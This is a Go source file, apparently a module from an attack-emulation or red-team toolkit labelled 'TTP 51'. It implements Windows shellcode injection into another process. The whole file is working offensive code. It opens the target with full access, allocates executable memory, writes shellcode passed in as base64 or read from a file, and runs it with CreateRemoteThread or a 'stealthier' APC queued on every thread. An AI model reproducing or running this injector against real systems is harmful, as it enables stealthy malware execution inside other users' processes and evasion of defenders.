package ttp

// inject_shellcode_win.go -- TTP 51: shellcode injection (userland, no driver)
//
// Technique A (CreateRemoteThread):
//   1. OpenProcess(PROCESS_ALL_ACCESS, pid)
//   2. VirtualAllocEx(process, MEM_COMMIT, PAGE_EXECUTE_READWRITE)
//   3. WriteProcessMemory(shellcode)
//   4. CreateRemoteThread(process, execAddr, 0)
//
// Technique B (APC injection -- stealthier):
//   1. Same alloc + write
//   2. QueueUserAPC on every thread of target
//   3. Trigger: thread becomes alertable (SleepEx, WaitForSingleObjectEx, etc.)
//
// Shellcode source: base64-encoded in params, or path to raw bin file.
//
// params: "pid b64:<base64_shellcode> [apc]"
//       | "pid file:<path_to_bin> [apc]"
//       | "pid self [apc]"  -- inject null shellcode (test)

import (
	"encoding/base64"
	"fmt"
	"os"
	"strconv"
	"strings"
	"unsafe"
)

// InjectShellcode injects raw shellcode into a process.
func InjectShellcode(params string) (string, error) {
	parts := strings.Fields(params)
	if len(parts) < 2 {
		return "", fmt.Errorf("params: pid b64:<base64>|file:<path> [apc]")
	}

	pidN, err := strconv.ParseUint(parts[0], 10, 32)
	if err != nil {
		return "", fmt.Errorf("invalid pid: %s", parts[0])
	}
	pid := uint32(pidN)

	useAPC := len(parts) >= 3 && strings.ToLower(parts[2]) == "apc"

	shellcode, err := parseShellcodeArg(parts[1])
	if err != nil {
		return "", err
	}
	if len(shellcode) == 0 {
		return "", fmt.Errorf("shellcode is empty")
	}

	if useAPC {
		return injectShellcodeAPC(pid, shellcode)
	}
	return injectShellcodeThread(pid, shellcode)
}

func parseShellcodeArg(arg string) ([]byte, error) {
	if strings.HasPrefix(arg, "b64:") {
		raw, err := base64.StdEncoding.DecodeString(arg[4:])
		if err != nil {
			// Try URL encoding
			raw, err = base64.URLEncoding.DecodeString(arg[4:])
			if err != nil {
				return nil, fmt.Errorf("base64 decode: %w", err)
			}
		}
		return raw, nil
	}
	if strings.HasPrefix(arg, "file:") {
		data, err := os.ReadFile(arg[5:])
		if err != nil {
			return nil, fmt.Errorf("read shellcode file: %w", err)
		}
		return data, nil
	}
	if arg == "self" {
		// Probe only -- return empty placeholder (no-op exec)
		return []byte{0xC3}, nil // just RET
	}
	return nil, fmt.Errorf("shellcode: prefix with b64: or file: or use 'self'")
}

// injectShellcodeThread creates a remote thread at the shellcode address.
func injectShellcodeThread(pid uint32, shellcode []byte) (string, error) {
	hProc, _, err := procOpenProcess.Call(processAllAccess, 0, uintptr(pid))
	if hProc == 0 {
		return "", fmt.Errorf("OpenProcess pid %d: %w", pid, err)
	}
	defer procCloseHandle.Call(hProc)

	execAddr, _, err := procVirtualAllocEx.Call(
		hProc, 0, uintptr(len(shellcode)),
		memCommitReserve, pageExecuteReadWrite,
	)
	if execAddr == 0 {
		return "", fmt.Errorf("VirtualAllocEx: %w", err)
	}

	var written uintptr
	r, _, err := procWriteProcessMemory.Call(
		hProc, execAddr,
		uintptr(unsafe.Pointer(&shellcode[0])),
		uintptr(len(shellcode)),
		uintptr(unsafe.Pointer(&written)),
	)
	if r == 0 {
		procVirtualFreeEx.Call(hProc, execAddr, 0, memRelease)
		return "", fmt.Errorf("WriteProcessMemory: %w", err)
	}

	hThread, _, err := procCreateRemoteThread.Call(
		hProc, 0, 0,
		execAddr, 0, 0, 0,
	)
	if hThread == 0 {
		procVirtualFreeEx.Call(hProc, execAddr, 0, memRelease)
		return "", fmt.Errorf("CreateRemoteThread: %w", err)
	}
	defer procCloseHandle.Call(hThread)
	procWaitForSingleObject.Call(hThread, 3000)

	return fmt.Sprintf("[inject:sc] %d bytes injected into pid %d via thread at 0x%X", len(shellcode), pid, execAddr), nil
}

// injectShellcodeAPC queues shellcode as APC on all alertable threads.
func injectShellcodeAPC(pid uint32, shellcode []byte) (string, error) {
	hProc, _, err := procOpenProcess.Call(processAllAccess, 0, uintptr(pid))
	if hProc == 0 {
		return "", fmt.Errorf("OpenProcess pid %d: %w", pid, err)
	}
	defer procCloseHandle.Call(hProc)

	execAddr, _, err := procVirtualAllocEx.Call(
		hProc, 0, uintptr(len(shellcode)),
		memCommitReserve, pageExecuteReadWrite,
	)
	if execAddr == 0 {
		return "", fmt.Errorf("VirtualAllocEx: %w", err)
	}

	var written uintptr
	r, _, err := procWriteProcessMemory.Call(
		hProc, execAddr,
		uintptr(unsafe.Pointer(&shellcode[0])),
		uintptr(len(shellcode)),
		uintptr(unsafe.Pointer(&written)),
	)
	if r == 0 {
		procVirtualFreeEx.Call(hProc, execAddr, 0, memRelease)
		return "", fmt.Errorf("WriteProcessMemory: %w", err)
	}

	tids, err := getProcessThreads(pid)
	if err != nil || len(tids) == 0 {
		procVirtualFreeEx.Call(hProc, execAddr, 0, memRelease)
		return "", fmt.Errorf("no threads found in pid %d", pid)
	}

	queued := 0
	for _, tid := range tids {
		hThread, _, _ := procOpenThread.Call(threadAllAccess, 0, uintptr(tid))
		if hThread == 0 {
			continue
		}
		r2, _, _ := procQueueUserAPC.Call(execAddr, hThread, 0)
		if r2 != 0 {
			queued++
		}
		procCloseHandle.Call(hThread)
	}

	if queued == 0 {
		procVirtualFreeEx.Call(hProc, execAddr, 0, memRelease)
		return "", fmt.Errorf("QueueUserAPC: no threads accepted (no alertable threads?)")
	}

	return fmt.Sprintf("[inject:sc:apc] %d bytes queued on %d threads of pid %d at 0x%X", len(shellcode), queued, pid, execAddr), nil
}
